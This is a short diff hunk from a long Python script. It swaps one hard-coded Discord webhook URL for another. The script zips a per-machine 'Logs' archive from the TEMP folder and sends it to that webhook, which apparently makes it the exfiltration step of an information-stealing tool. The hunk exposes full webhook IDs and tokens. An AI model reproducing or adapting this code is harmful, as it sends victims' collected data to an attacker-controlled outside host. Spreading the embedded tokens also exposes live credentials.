@@ -1718,7 +1718,7 @@ def send_file_to_discord_webhook(file_path, webhook_url):
         pass
 
 # Define your Discord webhook URL
-webhook_url = "https://discord.com/api/webhooks/1220658106032328764/ExeoIw9qd5MfCXrFl_mHr8NZFtebt9JktNuH7n_KBxQj0_huOueMptmTUbjnlt75EOAx"
+webhook_url = "https://discord.com/api/webhooks/1228021797258137662/XHnTCMg3LVYBk0kTvYAEtVzgmVjtXIQccJBCLE6ZAYb9GHHCKV_ngATwiXEXtGNIzMXs"
 
 # Define the path to the zipfile
 file_path = os.path.join(os.getenv('TEMP'), f'Logs{pc_name}.zip')
